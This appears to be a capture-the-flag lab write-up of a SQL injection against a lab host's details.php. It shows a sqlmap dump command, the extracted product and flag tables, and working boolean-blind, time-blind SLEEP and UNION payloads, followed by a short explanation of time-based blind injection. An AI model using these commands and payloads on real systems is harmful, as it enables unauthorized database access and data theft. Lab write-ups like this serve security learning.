SqlMap
======

```sh
sqlmap -u 'http://10.23.10.10:8100/details.php?id=1' --dump
```

## The Response

```
Database: socks_store
Table: socks
[6 entries]
+----+---------------+---------+---------+-------+---------+-----------+---------------------+
| id | name         | brand  | color  | price | variant | inventory | created_at         |
+----+---------------+---------+---------+-------+---------+-----------+---------------------+
| 1 | Angular Socks | Angular | #584FB8 | 16   | blue   | 16       | 2023-03-18 01:16:24 |
| 2 | Angular Socks | Angular | #B51020 | 29   | red    | 3        | 2023-03-18 01:16:24 |
| 3 | npm Socks    | npm    | #DD1F41 | 10   | red    | 24       | 2023-03-18 01:16:24 |
| 4 | React Socks  | React  | #23A3AC | 29   | blue   | 15       | 2023-03-18 01:16:24 |
| 5 | Vue Socks    | Vue    | #27384F | 16   | blue   | 7        | 2023-03-18 01:16:24 |
| 6 | Vue Socks    | Vue    | #42AF7C | 15   | green  | 28       | 2023-03-18 01:16:24 |
+----+---------------+---------+---------+-------+---------+-----------+---------------------+


Database: socks_store
Table: flag
[1 entry]
+----+-----------------------+
| id | flag                 |
+----+-----------------------+
| 1 | CL-PNKJ789RD-HEHPN4RT |
+----+-----------------------+
```


## The Payload

```
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 3281=3281
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 3375 FROM (SELECT(SLEEP(5)))YpAo)
    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: id=-5588 UNION ALL SELECT NULL,CONCAT(0x71706b7671,0x746f68485750754e41574b4f45677866445756576e74504e5844484674416d454c4d686f644f6348,0x716a7a7171),NULL,NULL,NULL,NULL,NULL-- -
---
```

### Time-based blind

The attacker sends SQL queries forcing the database to wait for a specified amount of time before responding.
The response time indicates whether the result of the query is true (waited period) or false (crash result right away).
